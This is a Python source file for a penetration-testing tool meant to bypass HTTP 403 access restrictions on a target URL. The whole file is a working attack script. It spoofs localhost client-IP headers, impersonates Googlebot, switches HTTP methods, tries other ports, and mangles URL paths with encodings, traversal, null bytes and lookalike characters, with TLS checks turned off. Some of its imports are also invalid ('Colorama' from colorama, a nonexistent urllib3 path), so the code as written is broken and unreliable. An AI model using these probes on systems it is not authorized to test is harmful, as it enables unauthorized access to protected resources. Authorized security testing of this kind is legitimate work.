#!/usr/bin/env python3
"""
0x403 - HTTP 403 Forbidden Bypass Testing Tool
For authorized penetration testing and bug bounty hunting only.
                                                  by 0xLpv3r v1
"""

import requests
import urllib.parse
import sys
import time
from urllib3.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
from colorama import Colorama, Fore, Style, init

# Disable SSL warnings for testing
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
init(autoreset=True)

class BypassTester:
    def __init__(self, url, delay=0.5, timeout=10):
        self.base_url = url
        self.delay = delay
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.successful_bypasses = []
        
    def print_success(self, message):
        print(f"{Fore.GREEN}[✓] {message}{Style.RESET_ALL}")
        
    def print_info(self, message):
        print(f"{Fore.BLUE}[i] {message}{Style.RESET_ALL}")
        
    def print_error(self, message):
        print(f"{Fore.RED}[✗] {message}{Style.RESET_ALL}")
        
    def print_warning(self, message):
        print(f"{Fore.YELLOW}[!] {message}{Style.RESET_ALL}")

    def test_request(self, method="GET", url=None, headers=None, description=""):
        """Make a test request and analyze the response"""
        if url is None:
            url = self.base_url
            
        if headers is None:
            headers = {}
            
        try:
            response = self.session.request(
                method=method,
                url=url,
                headers=headers,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            status_code = response.status_code
            
            if status_code != 403:
                success_msg = f"{description} | Status: {status_code} | Method: {method} | URL: {url}"
                if headers:
                    success_msg += f" | Headers: {headers}"
                self.print_success(success_msg)
                self.successful_bypasses.append({
                    'description': description,
                    'method': method,
                    'url': url,
                    'headers': headers,
                    'status_code': status_code
                })
                return True
            else:
                return False
                
        except requests.exceptions.RequestException as e:
            self.print_error(f"Request failed for {description}: {str(e)}")
            return False
        finally:
            time.sleep(self.delay)

    def test_http_methods(self):
        """Test different HTTP methods"""
        self.print_info("Testing HTTP methods...")
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'PATCH', 'TRACE', 'CONNECT']
        
        for method in methods:
            self.test_request(method=method, description=f"HTTP Method: {method}")

    def test_headers(self):
        """Test various header bypasses"""
        self.print_info("Testing header-based bypasses...")
        
        header_tests = [
            # IP-based headers
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-For': 'localhost'},
            {'X-Forwarded-For': '192.168.1.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Real-IP': 'localhost'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Forwarded-Host': '127.0.0.1'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            
            # Protocol headers
            {'X-Forwarded-Proto': 'https'},
            {'X-Forwarded-Protocol': 'https'},
            {'X-Forwarded-Ssl': 'on'},
            {'X-Url-Scheme': 'https'},
            
            # Miscellaneous headers
            {'X-Requested-With': 'XMLHttpRequest'},
            {'X-Frame-Options': 'SAMEORIGIN'},
            {'Referer': 'https://google.com'},
            {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
            {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)'},
            {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'},
        ]
        
        for headers in header_tests:
            header_desc = ', '.join([f"{k}: {v}" for k, v in headers.items()])
            self.test_request(headers=headers, description=f"Headers: {header_desc}")

    def test_url_variations(self):
        """Test URL path manipulations"""
        self.print_info("Testing URL variations...")
        
        # Parse the original URL
        parsed = urllib.parse.urlparse(self.base_url)
        base_path = parsed.path
        
        variations = [
            # Trailing slash variations
            base_path + '/',
            base_path.rstrip('/'),
            
            # Case variations
            base_path.upper(),
            base_path.lower(),
            base_path.capitalize(),
            
            # Encoding variations
            urllib.parse.quote(base_path),
            urllib.parse.quote(base_path, safe=''),
            urllib.parse.quote_plus(base_path),
            
            # Double encoding
            urllib.parse.quote(urllib.parse.quote(base_path, safe=''), safe=''),
            
            # Path traversal
            base_path + '/.',
            base_path + '/./',
            './' + base_path.lstrip('/'),
            base_path + '/../' + base_path.split('/')[-1],
            
            # Special characters
            base_path + '%20',
            base_path + '%09',
            base_path + '%00',
            base_path + '?',
            base_path + '#',
            base_path + '&',
            base_path + '/*',
            
            # Unicode variations
            base_path.replace('a', 'а'),  # Cyrillic 'a'
            
            # HTTP Parameter Pollution
            base_path + '?param=1',
            base_path + '?param=1&param=2',
        ]
        
        for variation in variations:
            new_url = f"{parsed.scheme}://{parsed.netloc}{variation}"
            self.test_request(url=new_url, description=f"URL Variation: {variation}")

    def test_protocol_variations(self):
        """Test protocol and port variations"""
        self.print_info("Testing protocol variations...")
        
        parsed = urllib.parse.urlparse(self.base_url)
        
        # Protocol variations
        if parsed.scheme == 'https':
            http_url = self.base_url.replace('https://', 'http://')
            self.test_request(url=http_url, description="Protocol: HTTP instead of HTTPS")
        else:
            https_url = self.base_url.replace('http://', 'https://')
            self.test_request(url=https_url, description="Protocol: HTTPS instead of HTTP")
        
        # Port variations (common ones)
        common_ports = [80, 443, 8080, 8443, 8000, 8888, 3000]
        for port in common_ports:
            if parsed.port != port:
                new_url = f"{parsed.scheme}://{parsed.hostname}:{port}{parsed.path}"
                self.test_request(url=new_url, description=f"Port variation: {port}")

    def test_combined_techniques(self):
        """Test combinations of techniques"""
        self.print_info("Testing combined techniques...")
        
        # Combine header + URL variations
        headers = {'X-Forwarded-For': '127.0.0.1'}
        url_with_slash = self.base_url + '/'
        self.test_request(url=url_with_slash, headers=headers, 
                         description="Combined: X-Forwarded-For + trailing slash")
        
        # Combine method + headers
        headers = {'X-Real-IP': '127.0.0.1'}
        self.test_request(method='POST', headers=headers,
                         description="Combined: POST method + X-Real-IP")

    def run_all_tests(self):
        """Run all bypass tests"""
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}0x403 - HTTP 403 Forbidden Bypass Testing Tool")
        print(f"{Fore.CYAN}Target: {self.base_url}")
        print(f"{Fore.CYAN}{'='*60}")
        
        # Test original request
        self.print_info("Testing original request...")
        original_response = self.test_request(description="Original request")
        if original_response:
            self.print_warning("Original request didn't return 403. Tool may not be needed.")
            return
        
        # Run all test categories
        self.test_http_methods()
        self.test_headers()
        self.test_url_variations()
        self.test_protocol_variations()
        self.test_combined_techniques()
        
        # Print summary
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}SUMMARY")
        print(f"{Fore.CYAN}{'='*60}")
        
        if self.successful_bypasses:
            self.print_success(f"Found {len(self.successful_bypasses)} successful bypasses:")
            for bypass in self.successful_bypasses:
                print(f"{Fore.GREEN}  → {bypass['description']}")
        else:
            self.print_warning("No successful bypasses found.")

def main():
    parser = argparse.ArgumentParser(description='0x403 - HTTP 403 Forbidden Bypass Testing Tool')
    parser.add_argument('url', help='Target URL to test')
    parser.add_argument('--delay', type=float, default=0.5, help='Delay between requests (seconds)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout (seconds)')
    
    args = parser.parse_args()
    
    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        print(f"{Fore.RED}Error: URL must start with http:// or https://")
        sys.exit(1)
    
    print(f"{Fore.YELLOW}WARNING: Only use this tool on systems you own or have explicit permission to test!")
    print(f"{Fore.YELLOW}Unauthorized testing may be illegal in your jurisdiction.")
    
    try:
        tester = BypassTester(args.url, args.delay, args.timeout)
        tester.run_all_tests()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Testing interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()